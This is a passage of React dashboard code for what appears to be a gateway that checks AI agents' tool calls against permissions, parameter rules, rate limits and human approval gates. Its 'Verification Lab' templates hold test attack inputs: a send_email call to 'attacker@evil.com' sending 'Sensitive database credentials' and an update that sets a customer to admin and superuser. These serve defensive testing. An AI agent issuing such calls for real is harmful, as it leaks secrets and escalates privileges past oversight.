                            <span style={{ ...styles.badge, background: 'rgba(255, 92, 92, 0.12)', color: 'var(--tier-high)' }}>
                              DENIED (DEFAULT)
                            </span>
                          )}
                        </td>
                        <td style={styles.td}>
                          <button
                            style={isAllowed ? styles.denyToggleBtn : styles.allowToggleBtn}
                            onClick={() => handleTogglePerm(tool.tool_id, isAllowed)}
                            disabled={isBusy}
                          >
                            {isBusy ? 'Saving…' : isAllowed ? 'Revoke Access' : 'Authorize Capability'}
                          </button>
                        </td>
                      </tr>
                    )
                  })
                )}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}

// ─── SCREEN 3: CAPABILITIES (TOOLS, RISK TIERS & RATE LIMITS) ───────────────

function CapabilitiesView({ tools, onRefresh, onTestCapability, currentEnv }) {
  const [showAddModal, setShowAddModal] = useState(false)
  const [newTool, setNewTool] = useState({
    name: '', category: 'crm', risk_level: 'medium', requires_approval: false, description: ''
  })
  const [saving, setSaving] = useState(false)
  const [editingLimitTool, setEditingLimitTool] = useState(null)
  const [limitInput, setLimitInput] = useState(10)

  const handleCreateTool = async (e) => {
    e.preventDefault()
    if (!newTool.name.trim()) return
    setSaving(true)
    try {
      await api.createTool(
        newTool.name.trim(),
        newTool.category,
        newTool.risk_level,
        newTool.requires_approval,
        newTool.description.trim()
      )
      setShowAddModal(false)
      setNewTool({ name: '', category: 'crm', risk_level: 'medium', requires_approval: false, description: '' })
      if (onRefresh) await onRefresh()
    } catch (err) {
      alert(`Error creating capability: ${err.message}`)
    } finally {
      setSaving(false)
    }
  }

  const handleSaveRateLimit = async (toolName) => {
    try {
      await api.setRateLimit(toolName, limitInput)
      setEditingLimitTool(null)
      if (onRefresh) onRefresh()
    } catch (err) {
      alert(`Error setting rate limit: ${err.message}`)
    }
  }

  return (
    <div>
      <div style={styles.viewControlsBar}>
        <div style={{ fontSize: 13, color: 'var(--text-muted)' }}>
          Registered host tools, API integrations, and execution endpoints mediated by the reference monitor.
        </div>
        <button style={styles.primaryActionBtn} onClick={() => setShowAddModal(true)}>
          + Register Capability Definition
        </button>
      </div>

      {tools.length === 0 ? (
        <EmptyStateCard
          icon="⚙"
          title="NO CAPABILITIES REGISTERED"
          subtitle={`No tool definitions exist in this environment (${currentEnv}). Register a capability to enforce argument invariants and 60-second fixed/tumbling window rate limits.`}
          actionLabel="+ Register First Capability"
          onAction={() => setShowAddModal(true)}
        />
      ) : (
        <div style={styles.tableWrap}>
          <table style={styles.table}>
            <thead>
              <tr>
                <th style={styles.th}>Capability Name</th>
                <th style={styles.th}>Category</th>
                <th style={styles.th}>Risk Level</th>
                <th style={styles.th}>Human Approval Gate</th>
                <th style={styles.th}>Rate Limit Window</th>
                <th style={styles.th}>Description</th>
                <th style={styles.th}>Actions</th>
              </tr>
            </thead>
            <tbody>
              {tools.map((tool) => (
                <tr key={tool.tool_id || tool.name} style={styles.tr}>
                  <td style={{ ...styles.td, ...styles.mono, fontWeight: 700 }}>{tool.name}</td>
                  <td style={styles.td}>{tool.category}</td>
                  <td style={styles.td}><RiskTierBadge level={tool.risk_level} /></td>
                  <td style={styles.td}>
                    {tool.requires_approval ? (
                      <span style={{ ...styles.smallBadge, background: 'rgba(245, 185, 66, 0.15)', color: '#facc15' }}>
                        REQUIRED (≥ 7.0 Score)
                      </span>
                    ) : (
                      <span style={{ color: 'var(--text-dim)', fontSize: 11.5 }}>Automated</span>
                    )}
                  </td>
                  <td style={styles.td}>
                    {editingLimitTool === tool.name ? (
                      <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                        <input
                          type="number"
                          style={{ ...styles.input, width: 60, padding: '3px 6px', fontSize: 11.5 }}
                          value={limitInput}
                          onChange={(e) => setLimitInput(e.target.value)}
                        />
                        <button style={styles.tinySaveBtn} onClick={() => handleSaveRateLimit(tool.name)}>Save</button>
                        <button style={styles.tinyCancelBtn} onClick={() => setEditingLimitTool(null)}>✕</button>
                      </div>
                    ) : (
                      <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 12 }}>60s window</span>
                        <button
                          style={styles.editGhostBtn}
                          onClick={() => {
                            setEditingLimitTool(tool.name)
                            setLimitInput(10)
                          }}
                          title="Configure rate limit quota"
                        >
                          ✎
                        </button>
                      </div>
                    )}
                  </td>
                  <td style={{ ...styles.td, fontSize: 12, color: 'var(--text-muted)' }}>
                    {tool.description || '—'}
                  </td>
                  <td style={styles.td}>
                    <button
                      style={styles.testGhostBtn}
                      onClick={() => onTestCapability(tool.name)}
                      title="Test this tool proposal in the Verification Lab"
                    >
                      Test in Lab →
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* Register Capability Modal */}
      {showAddModal && (
        <div style={styles.modalBackdrop}>
          <div style={styles.modalBox}>
            <div style={styles.modalHeader}>
              <div style={styles.modalTitle}>Register Capability Definition</div>
              <button style={styles.modalCloseBtn} onClick={() => setShowAddModal(false)}>✕</button>
            </div>

            <form onSubmit={handleCreateTool} style={styles.modalForm}>
              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Capability Name *</label>
                <input
                  style={{ ...styles.input, fontFamily: 'var(--font-mono)' }}
                  placeholder="e.g. refund_payment"
                  value={newTool.name}
                  onChange={(e) => setNewTool({ ...newTool, name: e.target.value })}
                  required
                />
              </div>

              <div style={styles.formRow}>
                <div style={{ ...styles.formGroup, flex: 1 }}>
                  <label style={styles.formLabel}>Category</label>
                  <select
                    style={styles.select}
                    value={newTool.category}
                    onChange={(e) => setNewTool({ ...newTool, category: e.target.value })}
                  >
                    <option value="crm">crm</option>
                    <option value="orders">orders</option>
                    <option value="communication">communication</option>
                    <option value="database">database</option>
                    <option value="filesystem">filesystem</option>
                  </select>
                </div>

                <div style={{ ...styles.formGroup, flex: 1 }}>
                  <label style={styles.formLabel}>Risk Tier</label>
                  <select
                    style={styles.select}
                    value={newTool.risk_level}
                    onChange={(e) => setNewTool({ ...newTool, risk_level: e.target.value })}
                  >
                    <option value="low">low</option>
                    <option value="medium">medium</option>
                    <option value="high">high</option>
                  </select>
                </div>
              </div>

              <div style={{ ...styles.formGroup, display: 'flex', alignItems: 'center', gap: 10 }}>
                <input
                  type="checkbox"
                  id="approval_chk"
                  checked={newTool.requires_approval}
                  onChange={(e) => setNewTool({ ...newTool, requires_approval: e.target.checked })}
                />
                <label htmlFor="approval_chk" style={{ fontSize: 13, color: 'var(--text-primary)', cursor: 'pointer' }}>
                  Require Human Approval Before Dispatch (Risk Gate)
                </label>
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Description</label>
                <input
                  style={styles.input}
                  placeholder="Capability description and side-effects"
                  value={newTool.description}
                  onChange={(e) => setNewTool({ ...newTool, description: e.target.value })}
                />
              </div>

              <div style={styles.modalFooter}>
                <button type="button" style={styles.cancelBtn} onClick={() => setShowAddModal(false)}>Cancel</button>
                <button type="submit" style={styles.primaryActionBtn} disabled={saving}>
                  {saving ? 'Registering…' : 'Register Capability'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}

// ─── SCREEN 4: INVARIANTS (PARAMETER & ROLE POLICIES) ───────────────────────

function InvariantsView({ policies, onRefresh, currentEnv }) {
  const [filterType, setFilterType] = useState('ALL')
  const [showAddModal, setShowAddModal] = useState(false)
  const [toggling, setToggling] = useState(null)
  const [newPolicy, setNewPolicy] = useState({
    name: '', policy_type: 'role_based', action: 'DENY', priority: 10, description: '', conditionJson: '{\n  "role": "support",\n  "blocked_tool": "delete_customer"\n}'
  })
  const [saving, setSaving] = useState(false)
  const [error, setError] = useState(null)

  const handleToggle = async (policy) => {
    setToggling(policy.policy_id)
    try {
      await api.togglePolicy(policy.policy_id, !policy.enabled)
      if (onRefresh) await onRefresh()
    } catch (err) {
      alert(`Error toggling invariant: ${err.message}`)
    } finally {
      setToggling(null)
    }
  }

  const handleAddPolicy = async (e) => {
    e.preventDefault()
    if (!newPolicy.name.trim()) return
    setSaving(true)
    setError(null)

    let parsedCond = {}
    try {
      parsedCond = JSON.parse(newPolicy.conditionJson)
    } catch (err) {
      setError(`Invalid condition JSON: ${err.message}`)
      setSaving(false)
      return
    }

    try {
      await api.createPolicy({
        name: newPolicy.name.trim(),
        description: newPolicy.description.trim(),
        policy_type: newPolicy.policy_type,
        action: newPolicy.action,
        condition: parsedCond,
        priority: Number(newPolicy.priority),
      })
      setShowAddModal(false)
      setNewPolicy({
        name: '', policy_type: 'role_based', action: 'DENY', priority: 10, description: '', conditionJson: '{\n  "role": "support",\n  "blocked_tool": "delete_customer"\n}'
      })
      if (onRefresh) await onRefresh()
    } catch (err) {
      setError(err.message)
    } finally {
      setSaving(false)
    }
  }

  const filteredPolicies = useMemo(() => {
    if (filterType === 'ALL') return policies
    return policies.filter((p) => p.policy_type === filterType)
  }, [policies, filterType])

  return (
    <div>
      <div style={styles.viewControlsBar}>
        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <span style={{ fontSize: 13, color: 'var(--text-muted)' }}>Type:</span>
          {['ALL', 'role_based', 'parameter_validation', 'risk_threshold'].map((t) => (
            <button
              key={t}
              style={{
                ...styles.filterChip,
                ...(filterType === t ? styles.filterChipActive : {}),
              }}
              onClick={() => setFilterType(t)}
            >
              {t.replace('_', ' ').toUpperCase()}
            </button>
          ))}
        </div>

        <button style={styles.primaryActionBtn} onClick={() => setShowAddModal(true)}>
          + Declare Invariant Rule
        </button>
      </div>

      {filteredPolicies.length === 0 ? (
        <EmptyStateCard
          icon="📜"
          title="NO INVARIANTS CONFIGURED"
          subtitle={`No parameter policies or execution invariants are active in this environment (${currentEnv}). Declare an invariant rule to enforce parameter constraints.`}
          actionLabel="+ Declare First Invariant Rule"
          onAction={() => setShowAddModal(true)}
        />
      ) : (
        <div style={styles.tableWrap}>
          <table style={styles.table}>
            <thead>
              <tr>
                <th style={styles.th}>Invariant Rule Name</th>
                <th style={styles.th}>Type</th>
                <th style={styles.th}>Action</th>
                <th style={styles.th}>Priority</th>
                <th style={styles.th}>Condition Specification</th>
                <th style={styles.th}>Status</th>
                <th style={styles.th}>Action</th>
              </tr>
            </thead>
            <tbody>
              {filteredPolicies.map((policy) => {
                const isBusy = toggling === policy.policy_id

                return (
                  <tr key={policy.policy_id} style={styles.tr}>
                    <td style={{ ...styles.td, fontWeight: 700 }}>
                      <div>{policy.name}</div>
                      <div style={{ fontSize: 11, color: 'var(--text-dim)', marginTop: 2 }}>{policy.description}</div>
                    </td>
                    <td style={styles.td}>
                      <span style={{ ...styles.smallBadge, fontFamily: 'var(--font-mono)' }}>
                        {policy.policy_type}
                      </span>
                    </td>
                    <td style={styles.td}><DecisionBadge decision={policy.action} /></td>
                    <td style={{ ...styles.td, ...styles.mono, fontSize: 12 }}>{policy.priority}</td>
                    <td style={styles.td}>
                      <pre style={styles.conditionMono}>
                        {JSON.stringify(policy.condition, null, 2)}
                      </pre>
                    </td>
                    <td style={styles.td}>
                      {policy.enabled ? (
                        <span style={{ ...styles.badge, background: 'rgba(74, 222, 128, 0.12)', color: 'var(--tier-safe)' }}>
                          ACTIVE
                        </span>
                      ) : (
                        <span style={{ ...styles.badge, background: 'var(--surface-raised)', color: 'var(--text-dim)' }}>
                          DISABLED
                        </span>
                      )}
                    </td>
                    <td style={styles.td}>
                      <button
                        style={policy.enabled ? styles.enabledToggle : styles.disabledToggle}
                        onClick={() => handleToggle(policy)}
                        disabled={isBusy}
                      >
                        {isBusy ? 'Saving…' : policy.enabled ? 'Disable' : 'Enable'}
                      </button>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
        </div>
      )}

      {/* Declare Invariant Modal */}
      {showAddModal && (
        <div style={styles.modalBackdrop}>
          <div style={{ ...styles.modalBox, maxWidth: 580 }}>
            <div style={styles.modalHeader}>
              <div style={styles.modalTitle}>Declare Invariant Rule</div>
              <button style={styles.modalCloseBtn} onClick={() => setShowAddModal(false)}>✕</button>
            </div>

            <form onSubmit={handleAddPolicy} style={styles.modalForm}>
              {error && <div style={styles.errorMsg}>{error}</div>}

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Invariant Name *</label>
                <input
                  style={styles.input}
                  placeholder="e.g. block_external_email_exfiltration"
                  value={newPolicy.name}
                  onChange={(e) => setNewPolicy({ ...newPolicy, name: e.target.value })}
                  required
                />
              </div>

              <div style={styles.formRow}>
                <div style={{ ...styles.formGroup, flex: 1 }}>
                  <label style={styles.formLabel}>Policy Type</label>
                  <select
                    style={styles.select}
                    value={newPolicy.policy_type}
                    onChange={(e) => setNewPolicy({ ...newPolicy, policy_type: e.target.value })}
                  >
                    <option value="role_based">role_based</option>
                    <option value="parameter_validation">parameter_validation</option>
                    <option value="risk_threshold">risk_threshold</option>
                  </select>
                </div>

                <div style={{ ...styles.formGroup, flex: 1 }}>
                  <label style={styles.formLabel}>Arbitrated Action</label>
                  <select
                    style={styles.select}
                    value={newPolicy.action}
                    onChange={(e) => setNewPolicy({ ...newPolicy, action: e.target.value })}
                  >
                    <option value="DENY">DENY (Block proposal)</option>
                    <option value="REQUIRE_APPROVAL">REQUIRE_APPROVAL (Hold for human)</option>
                    <option value="RATE_LIMIT">RATE_LIMIT (Quota violation)</option>
                    <option value="ALLOW">ALLOW (Explicit override)</option>
                  </select>
                </div>
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Evaluation Priority (Lower = Evaluated First)</label>
                <input
                  type="number"
                  style={styles.input}
                  value={newPolicy.priority}
                  onChange={(e) => setNewPolicy({ ...newPolicy, priority: e.target.value })}
                />
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Condition JSON</label>
                <textarea
                  style={styles.textareaMono}
                  rows={5}
                  value={newPolicy.conditionJson}
                  onChange={(e) => setNewPolicy({ ...newPolicy, conditionJson: e.target.value })}
                />
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Description</label>
                <input
                  style={styles.input}
                  placeholder="Why this invariant is required"
                  value={newPolicy.description}
                  onChange={(e) => setNewPolicy({ ...newPolicy, description: e.target.value })}
                />
              </div>

              <div style={styles.modalFooter}>
                <button type="button" style={styles.cancelBtn} onClick={() => setShowAddModal(false)}>Cancel</button>
                <button type="submit" style={styles.primaryActionBtn} disabled={saving}>
                  {saving ? 'Declaring…' : 'Declare Invariant'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}

// ─── SCREEN 5: LIVE INVOCATIONS STREAM (RUNTIME EVENTS) ─────────────────────

function LiveInvocationsView({
  toolCalls,
  agents,
  onRefresh,
  onInspectTrace,
  currentEnv,
  onNavigateToLab,
}) {
  const [filterAgent, setFilterAgent] = useState('ALL')
  const [filterDecision, setFilterDecision] = useState('ALL')
  const [search, setSearch] = useState('')

  const filteredCalls = useMemo(() => {
    return toolCalls.filter((c) => {
      if (filterAgent !== 'ALL' && c.agent_id !== filterAgent) return false
      if (filterDecision !== 'ALL' && c.decision !== filterDecision) return false
      if (search) {
        const s = search.toLowerCase()
        if (
          !c.tool_name.toLowerCase().includes(s) &&
          !c.reason.toLowerCase().includes(s) &&
          !c.call_id.toLowerCase().includes(s)
        ) {
          return false
        }
      }
      return true
    })
  }, [toolCalls, filterAgent, filterDecision, search])

  return (
    <div>
      <div style={styles.viewControlsBar}>
        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <input
            style={styles.searchInput}
            placeholder="Search by tool, reason, or call ID…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />

          <select
            style={styles.selectSmall}
            value={filterAgent}
            onChange={(e) => setFilterAgent(e.target.value)}
          >
            <option value="ALL">All Principals</option>
            {agents.map((a) => (
              <option key={a.agent_id} value={a.agent_id}>{a.name}</option>
            ))}
          </select>

          <select
            style={styles.selectSmall}
            value={filterDecision}
            onChange={(e) => setFilterDecision(e.target.value)}
          >
            <option value="ALL">All Decisions</option>
            <option value="ALLOW">ALLOW</option>
            <option value="DENY">BLOCK (Deny)</option>
            <option value="REQUIRE_APPROVAL">REQUIRE_APPROVAL</option>
            <option value="RATE_LIMIT">RATE_LIMIT</option>
          </select>
        </div>

        <button style={styles.refreshBtn} onClick={onRefresh}>
          ⟳ Refresh Ledger
        </button>
      </div>

      {toolCalls.length === 0 ? (
        <EmptyStateCard
          icon="📋"
          title="NO RUNTIME EVENTS YET"
          subtitle={`No structured tool proposals have been mediated by the PromptAegis gateway in this environment (${currentEnv}). Proposals sent to POST /intercept or executed in the Verification Lab will appear here upon refresh or polling.`}
          actionLabel="Execute Test Proposal in Verification Lab →"
          onAction={onNavigateToLab}
        />
      ) : (
        <div style={styles.tableWrap}>
          <table style={styles.table}>
            <thead>
              <tr>
                <th style={styles.th}>Timestamp</th>
                <th style={styles.th}>Principal</th>
                <th style={styles.th}>Capability</th>
                <th style={styles.th}>Decision</th>
                <th style={styles.th}>Enforcement Reason</th>
                <th style={styles.th}>Risk Score</th>
                <th style={styles.th}>Latency</th>
                <th style={styles.th}>Action</th>
              </tr>
            </thead>
            <tbody>
              {filteredCalls.length === 0 ? (
                <tr>
                  <td colSpan={8} style={styles.tdCenter}>
                    No decisions found matching filter criteria.
                  </td>
                </tr>
              ) : (
                filteredCalls.slice(0, 150).map((call) => (
                  <tr key={call.call_id} style={styles.tr}>
                    <td style={{ ...styles.td, ...styles.mono, fontSize: 11.5 }}>
                      {new Date(call.timestamp * 1000).toLocaleTimeString()}
                    </td>
                    <td style={{ ...styles.td, fontWeight: 600 }}>{call.agent_id}</td>
                    <td style={{ ...styles.td, ...styles.mono, fontSize: 12 }}>{call.tool_name}</td>
                    <td style={styles.td}><DecisionBadge decision={call.decision} /></td>
                    <td style={{ ...styles.td, fontSize: 12, color: 'var(--text-muted)' }}>
                      {call.reason}
                    </td>
                    <td style={styles.td}>
                      <span style={styles.monoValue}>{call.risk_score !== undefined ? call.risk_score.toFixed(1) : '0.0'}</span>
                    </td>
                    <td style={{ ...styles.td, ...styles.mono, fontSize: 11.5 }}>
                      {call.latency_ms !== undefined ? `${call.latency_ms.toFixed(2)} ms` : '—'}
                    </td>
                    <td style={styles.td}>
                      <button style={styles.traceBtn} onClick={() => onInspectTrace(call)}>
                        Inspect Decision Trace →
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      )}
    </div>
  )
}

// ─── SCREEN 6: DECISION TRACE (FORENSIC AUDIT EVIDENCE) ─────────────────────

function DecisionTraceView({ selectedCall, toolCalls, onSelectCall, onNavigateToLab, currentEnv }) {
  const call = selectedCall || (toolCalls.length > 0 ? toolCalls[0] : null)

  if (!call) {
    return (
      <EmptyStateCard
        icon="🔍"
        title="NO INVOCATION SELECTED FOR DECISION TRACE"
        subtitle={`No runtime events exist in this environment (${currentEnv}) to trace. Execute a scenario in the Verification Lab or dispatch a proposal to POST /intercept to inspect multi-stage forensic evidence.`}
        actionLabel="Go to Verification Lab →"
        onAction={onNavigateToLab}
      />
    )
  }

  const isBlocked = call.decision && call.decision !== 'ALLOW'
  const reasonLower = (call.reason || '').toLowerCase()
  const isRateLimited = call.decision === 'RATE_LIMIT' || reasonLower.includes('rate limit')
  const isRbacBlocked = (call.decision === 'DENY' || call.decision === 'BLOCK') && (reasonLower.includes('permission') || reasonLower.includes('unauthorized') || reasonLower.includes('rbac') || reasonLower.includes('not permitted'))
  const isPolicyBlocked = (call.decision === 'DENY' || call.decision === 'BLOCK') && (reasonLower.includes('policy') || reasonLower.includes('invariant') || reasonLower.includes('validation'))
  const isApprovalRequired = call.decision === 'REQUIRE_APPROVAL'

  const notRecordedBadge = {
    fontSize: 10,
    fontWeight: 700,
    letterSpacing: '0.04em',
    padding: '2px 8px',
    borderRadius: 3,
    color: 'var(--text-muted)',
    background: 'rgba(148, 163, 184, 0.12)',
    border: '1px solid var(--border)',
    textTransform: 'uppercase',
  }

  const skippedBadge = {
    fontSize: 10,
    fontWeight: 700,
    letterSpacing: '0.04em',
    padding: '2px 8px',
    borderRadius: 3,
    color: 'var(--text-dim)',
    background: 'rgba(100, 116, 139, 0.10)',
    border: '1px solid var(--border)',
    textTransform: 'uppercase',
  }

  return (
    <div style={styles.traceContainer}>
      {/* Event Selector Strip */}
      <div style={styles.traceSelectorRow}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={styles.formLabel}>Inspect Recorded Event:</span>
          <select
            style={styles.select}
            value={call.call_id}
            onChange={(e) => {
              const found = toolCalls.find((c) => c.call_id === e.target.value)
              if (found) onSelectCall(found)
            }}
          >
            {toolCalls.slice(0, 50).map((c) => (
              <option key={c.call_id} value={c.call_id}>
                [{new Date(c.timestamp * 1000).toLocaleTimeString()}] {c.agent_id} → {c.tool_name} ({c.decision})
              </option>
            ))}
          </select>
        </div>
        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-dim)' }}>
          Forensic Call ID: {call.call_id}
        </div>
      </div>

      {/* Forensic Overview Card */}
      <div style={styles.traceHeroCard}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 14 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <DecisionBadge decision={call.decision} />
            <div>
              <div style={styles.decisionTitle}>
                DECISION: <strong>{call.decision}</strong>
              </div>
              <div style={styles.decisionReasonMono}>{call.reason}</div>
            </div>
          </div>
          <div style={{ textAlign: 'right' }}>
            <div style={styles.latencyValue}>{call.latency_ms !== undefined ? `${call.latency_ms.toFixed(2)} ms` : '—'}</div>
            <div style={styles.callIdMono}>Timestamp: {new Date(call.timestamp * 1000).toISOString()}</div>
          </div>
        </div>

        <div style={styles.traceMetaGrid}>
          <div>
            <div style={styles.metaLabel}>PROPOSED PRINCIPAL</div>
            <div style={styles.metaValue}>{call.agent_id}</div>
          </div>
          <div>
            <div style={styles.metaLabel}>TARGET CAPABILITY</div>
            <div style={styles.metaValue}><code>{call.tool_name}</code></div>
          </div>
          <div>
            <div style={styles.metaLabel}>CALCULATED RISK SCORE</div>
            <div style={styles.metaValue}>{call.risk_score !== undefined ? `${call.risk_score.toFixed(1)} / 10.0` : '0.0 / 10.0'}</div>
          </div>
          <div>
            <div style={styles.metaLabel}>ENFORCEMENT ACTION</div>
            <div style={{ ...styles.metaValue, color: isBlocked ? 'var(--tier-high)' : 'var(--tier-safe)' }}>
              {isBlocked ? 'HOST EXECUTION PREVENTED' : 'HOST DISPATCH PERMITTED'}
            </div>
          </div>
        </div>
      </div>

      {/* Sequential 6-Stage Reference Monitor Pipeline Reconstruction */}
      <div style={styles.traceSectionHeading}>SEQUENTIAL REFERENCE MONITOR PIPELINE RECONSTRUCTION (6 CANONICAL STAGES):</div>
      <div style={styles.traceStagesContainer}>
        {/* Stage 1: Rate Limiter (60s Fixed/Tumbling Window) */}
        <div style={{
          ...styles.traceStageItem,
          borderColor: isRateLimited ? 'var(--tier-high)' : 'var(--border)'
        }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>1. Rate Limiter (60s Fixed/Tumbling Window)</span>
            <span style={isRateLimited ? styles.stageStatusBlock : notRecordedBadge}>
              {isRateLimited ? 'BLOCKED' : 'Not recorded (historical schema)'}
            </span>
          </div>
          <div style={styles.stageDetails}>
            {isRateLimited
              ? `Call rate limit exceeded on capability ${call.tool_name}. Blocked by 60-second fixed/tumbling window counter.`
              : 'Evaluated against SQLite rate_limit_counters. Historical invocation record does not persist intermediate stage metrics.'}
          </div>
        </div>

        {/* Stage 2: Identity & RBAC Capability Gate */}
        <div style={{
          ...styles.traceStageItem,
          borderColor: isRbacBlocked ? 'var(--tier-high)' : (isRateLimited ? 'var(--border)' : 'var(--signal)')
        }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>2. Identity & RBAC Capability Gate</span>
            <span style={
              isRateLimited
                ? skippedBadge
                : (isRbacBlocked ? styles.stageStatusBlock : styles.stageStatusPass)
            }>
              {isRateLimited ? 'SKIPPED / NOT EVALUATED' : (isRbacBlocked ? 'BLOCKED' : 'PASS')}
            </span>
          </div>
          <div style={styles.stageDetails}>
            {isRateLimited
              ? 'Pipeline halted at Stage 1 (Rate Limiter). Capability RBAC evaluation was skipped.'
              : (isRbacBlocked
                  ? `Principal identity ${call.agent_id} denied permission for capability ${call.tool_name} by default-deny matrix.`
                  : `Verified principal identity ${call.agent_id} has permission to invoke ${call.tool_name}.`)}
          </div>
        </div>

        {/* Stage 3: Parameter Canonicalization */}
        <div style={{ ...styles.traceStageItem, borderColor: 'var(--border)' }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>3. Parameter Canonicalization</span>
            <span style={
              (isRateLimited || isRbacBlocked)
                ? skippedBadge
                : notRecordedBadge
            }>
              {(isRateLimited || isRbacBlocked) ? 'SKIPPED / NOT EVALUATED' : 'Not recorded (historical schema)'}
            </span>
          </div>
          <div style={styles.stageDetails}>
            {(isRateLimited || isRbacBlocked)
              ? 'Pipeline halted prior to argument processing.'
              : 'Normalized input encodings, path formats, and argument schema prior to policy checks.'}
          </div>
          <pre style={styles.traceJsonPre}>{JSON.stringify(call.arguments, null, 2)}</pre>
        </div>

        {/* Stage 4: Parameter Invariant Policy Evaluation */}
        <div style={{
          ...styles.traceStageItem,
          borderColor: isPolicyBlocked ? 'var(--tier-high)' : ((isRateLimited || isRbacBlocked) ? 'var(--border)' : 'var(--signal)')
        }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>4. Parameter Invariant Policy Evaluation</span>
            <span style={
              (isRateLimited || isRbacBlocked)
                ? skippedBadge
                : (isPolicyBlocked ? styles.stageStatusBlock : styles.stageStatusPass)
            }>
              {(isRateLimited || isRbacBlocked) ? 'SKIPPED / NOT EVALUATED' : (isPolicyBlocked ? 'BLOCKED' : 'PASS')}
            </span>
          </div>
          <div style={styles.stageDetails}>
            {(isRateLimited || isRbacBlocked)
              ? 'Pipeline halted prior to parameter invariant evaluation.'
              : (isPolicyBlocked
                  ? `Violated parameter invariant policy: ${call.reason}`
                  : 'Evaluated argument constraints and schema invariants. Zero violations detected.')}
          </div>
        </div>

        {/* Stage 5: Risk Scoring & Approval Gate */}
        <div style={{
          ...styles.traceStageItem,
          borderColor: isApprovalRequired ? 'var(--tier-medium)' : ((isRateLimited || isRbacBlocked || isPolicyBlocked) ? 'var(--border)' : 'var(--signal)')
        }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>5. Risk Scoring & Approval Gate</span>
            <span style={
              (isRateLimited || isRbacBlocked || isPolicyBlocked)
                ? skippedBadge
                : (isApprovalRequired ? styles.stageStatusApproval : styles.stageStatusPass)
            }>
              {(isRateLimited || isRbacBlocked || isPolicyBlocked)
                ? 'SKIPPED / NOT EVALUATED'
                : (isApprovalRequired ? 'REQUIRE_APPROVAL' : 'PASS')}
            </span>
          </div>
          <div style={styles.stageDetails}>
            {(isRateLimited || isRbacBlocked || isPolicyBlocked)
              ? 'Pipeline halted prior to risk scoring / approval evaluation.'
              : (isApprovalRequired
                  ? `Calculated risk score: ${call.risk_score?.toFixed(1) || '0.0'} / 10.0. Halted for human verification before dispatch.`
                  : `Calculated risk score: ${call.risk_score?.toFixed(1) || '0.0'} / 10.0. Below critical threshold.`)}
          </div>
        </div>

        {/* Stage 6: Structured Audit Log */}
        <div style={{ ...styles.traceStageItem, borderColor: '#A78BFA' }}>
          <div style={styles.stageTopRow}>
            <span style={styles.stageTitle}>6. Structured Audit Log (Forensic Record)</span>
            <span style={{ ...styles.stageStatusPass, color: '#A78BFA', background: 'rgba(167, 139, 250, 0.12)' }}>
              RECORDED IN AUDIT LEDGER
            </span>
          </div>
          <div style={styles.stageDetails}>
            Authoritative event record committed to SQLite environment database: <code>{call.call_id}</code>.
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── SCREEN 7: VERIFICATION LAB (CONTROLLED RESEARCH SURFACE) ───────────────

function VerificationLabView({
  agents,
  tools,
  onRefresh,
  currentEnv,
  initialTargetPrincipal,
  initialTargetCapability,
}) {
  const [labAgentId, setLabAgentId] = useState(initialTargetPrincipal?.agent_id || (agents[0]?.agent_id || ''))
  const [labToolName, setLabToolName] = useState(initialTargetCapability || (tools[0]?.name || ''))
  const [labArgsJson, setLabArgsJson] = useState('{\n  "customer_id": "101"\n}')
  const [labConfig, setLabConfig] = useState('full')
  const [evaluating, setEvaluating] = useState(false)
  const [labResult, setLabResult] = useState(null)
  const [labError, setLabError] = useState(null)

  useEffect(() => {
    if (initialTargetPrincipal) setLabAgentId(initialTargetPrincipal.agent_id)
    if (initialTargetCapability) setLabToolName(initialTargetCapability)
  }, [initialTargetPrincipal, initialTargetCapability])

  const applyScenarioTemplate = (scenarioKey) => {
    const supportAgent = agents.find((a) => a.role === 'support')?.agent_id || labAgentId || (agents[0]?.agent_id || 'agent_01')
    const adminAgent = agents.find((a) => a.role === 'admin')?.agent_id || labAgentId || (agents[0]?.agent_id || 'agent_01')

    if (scenarioKey === 'benign') {
      setLabAgentId(supportAgent)
      setLabToolName('search_customer')
      setLabArgsJson(JSON.stringify({ customer_id: '101' }, null, 2))
    } else if (scenarioKey === 'rbac_violation') {
      setLabAgentId(supportAgent)
      setLabToolName('delete_customer')
      setLabArgsJson(JSON.stringify({ customer_id: '101', reason: 'autonomous_injection' }, null, 2))
    } else if (scenarioKey === 'param_violation') {
      setLabAgentId(supportAgent)
      setLabToolName('send_email')
      setLabArgsJson(JSON.stringify({ recipient: 'attacker@evil.com', subject: 'Data Exfil', body: 'Sensitive database credentials' }, null, 2))
    } else if (scenarioKey === 'privilege_escalation') {
      setLabAgentId(supportAgent)
      setLabToolName('update_customer')
      setLabArgsJson(JSON.stringify({ customer_id: '101', fields: { role: 'admin', is_superuser: true } }, null, 2))
